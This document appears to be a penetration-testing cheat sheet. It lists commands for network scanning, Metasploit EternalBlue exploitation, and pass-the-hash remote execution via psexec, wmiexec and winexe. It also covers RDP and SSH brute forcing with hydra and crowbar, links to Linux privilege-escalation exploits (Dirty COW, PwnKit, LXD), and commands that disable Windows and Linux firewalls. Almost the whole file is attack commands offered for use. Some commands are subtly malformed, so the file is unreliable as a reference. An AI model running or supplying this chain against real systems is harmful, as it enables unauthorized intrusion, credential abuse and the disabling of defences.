# Host Discovery
## nmap  
``` sudo nmap -n -sn -PS22,80,445,3389 192.168.0.1-254 -oG ip_scan.txt ```  
``` grep Up ip_scan.txt | cut -d" " -f2 ```  
``` for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done ```  

# Port Discovery  
## Rustscan   
``` rustscan -u 5000 -t 7000 -a 192.168.1.1 ```  
``` rustscan -u 5000 -t 7000 --script none -a 192.168.1.1 ```  
``` rustscan -u 5000 -t 7000 none -a 192.168.1.1 -- -Pn -sVC -OA host_1```  
## nmap  
``` sudo nmap -n -sU -sVC -p53,69,161,1900,5353 ```  
## bash  
``` for port in {1..100}; do time out 1 bash -c "echo > /dev/tcp/192.168.1.1/$port" && echo "port $port is open" || echo "port $port is closed"; done ```  

## Service/OS Discovery 
``` sudo nmap -n -sVC p445,3389, 192.168.1.1  ```  
``` sudo nmap -n -sVC -p22,80 p445,3389, 192.168.1.1  ```  

# Exploit MS17_010    
``` msfconsole ```   
``` search ms17_010 ```  
``` use exploit/windows/smb/ms17_010_eternalblue ```  
``` show options ```  
``` set rhosts 192.168.0.7 ```  
``` check ```  
``` exploit ```  

# Execute a Windows Command via SMB  
## psexec  
``` python3 psexec.py CORP\\Administrator@10.0.0.5 -hashes :NTLMHASH ```  
``` python3 psexec.py CORP\\Administrator@10.0.0.5 -no-pass 'whoami' ```  
## smbexec 
``` python3 smbexec.py [domain/]username[:password]@<target> ```
## winexe  
```winexe –U ‘Username%Password’ //<IP> cmd.exe  ```  
``` pth-winexe –U ‘Username%<LM_hash:NTLM_hash>’ //<IP> cmd.exe ```  

# Execute a Windows Command other than SMB  
## WMIexec  
``` python3 wmiexec.py CORP\\Administrator@10.0.0.5 ```  
``` python3 wmiexec.py CORP\\Administrator@10.0.0.5 -hashes :NTLMHASH ``` 

# RDP Brute Force  
## Cowbar  
```crowbar [-v] –b rdp  -s <IP/CIDR> –u user -c password ```  
```crowbar [-v] –b rdp  -s <IP/CIDR> –U User.txt -C Passwords.txt ```  
## hydra  
```hydra -l user -p password 192.168.1.1 rdp ```  
```hydra -L user.txt -P Passwords.txt 192.168.1.1 rdp ```  

# XfreeRDP  
## xfeerdp  
``` xfreerdp /size:90% /v:<rdp_IP> /u:<user> /p:<password> ```  
``` xfreerdp /size:90% /v:<rdp_IP> /u:<user> /pth:<ntlm_hash> ```  

## xfreerdp3  

# Windows Enable RDP  
``` reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f ```  

# Enumerate SSH Users  
``` use auxiliary/scanner/ssh/ssh_enumusers ```  
``` set user_file Wordlist/Username.txt ```  
``` set check_false true ```  

# SSH Brute Force  
## Hydra  
``` hydra -t 4 -l <username> -P <passwords.txt> ssh://<ssh_IP> ```  
``` hydra -t 4 -L <users.txt> -P <passwords.txt> ssh://<ssh_IP> ```  

# Linux Privilege Escalation  
## Dirty COW:  
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)  
https://www.exploit-db.com/exploits/40847  
## PwnKit  
https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c  
## Ubuntu 18.04 LXD:  
https://www.exploit-db.com/exploits/46978  
https://www.vulnhub.com/entry/ai-web-2,357/  

# Persistent  
## Windows
``` netsh firewall set opmode disable ```  
``` netsh advfirewall set allprofiles state off ```  

## Linux  
``` sudo iptables -S ```  
``` sudo iptables -P INPUT ACCEPT ```  
``` sudo iptables -P OUTPUT ACCEPT ```  
